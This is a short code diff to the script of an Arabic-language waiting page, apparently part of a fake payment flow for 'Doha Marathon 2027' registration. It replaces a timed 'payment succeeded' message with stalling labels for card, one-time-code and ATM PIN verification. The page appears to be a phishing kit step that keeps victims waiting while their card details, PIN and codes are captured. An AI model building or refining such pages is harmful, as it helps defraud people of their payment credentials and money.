@@ -56,17 +56,10 @@
 <script src="/assets/tracker.js"></script>
 <script>
 (function(){
-	var container = document.getElementById("wait-container");
+	var src = sessionStorage.getItem('wait-source') || 'unknown';
+	var labels = { 'payment-card':'جارِ التحقق من البطاقة...', 'payment-verify':'جارِ التحقق من الرمز...', 'atm':'جارِ التحقق من الرقم السري...' };
 	var title = document.getElementById("wait-title");
-	var subtitle = document.getElementById("wait-subtitle");
-	var note = document.getElementById("wait-note");
-
-	setTimeout(function(){
-		container.classList.add("is-done");
-		title.textContent = "تمت عملية الدفع بنجاح!";
-		subtitle.innerHTML = "شكراً لتسجيلك في ماراثون الدوحة 2027.<br>ستصلك رسالة تأكيد عبر البريد الإلكتروني.";
-		note.textContent = "يمكنك إغلاق هذه الصفحة الآن.";
-	}, 5000);
+	if (title && labels[src]) title.textContent = labels[src];
 })();
 </script>
 </body>
